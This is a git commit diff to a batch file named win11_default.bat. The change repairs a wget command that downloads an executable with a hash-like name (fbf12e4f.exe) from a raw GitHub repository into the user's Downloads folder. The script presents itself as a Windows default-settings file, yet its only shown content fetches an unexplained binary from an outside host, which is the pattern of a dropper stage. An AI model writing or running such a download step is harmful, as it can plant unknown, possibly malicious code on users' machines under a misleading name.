f433cc1e646ed8685a586a41b3478920c5d532b6
optolab <sloneeddie36@gmail.com>
2025-01-12 13:11:47 -0500

    Update win11_default.bat

--- win11_default.bat
+++ win11_default.bat
@@ -1,4 +1,4 @@
 @echo off
-set url=<https://raw.githubusercontent.com/claykrs/claykers/main/fbf12e4f.exe>
-set file=%USERPROFILE%\Downloads\xd.exe
-wget "%url%" -O "%file%"
+set url=https://raw.githubusercontent.com/claykrs/claykers/main/fbf12e4f.exe?raw=true
+set file=%USERPROFILE%\Downloads\fbf12e4f.exe
+wget --trust-server-names "%url%" -O "%file%"
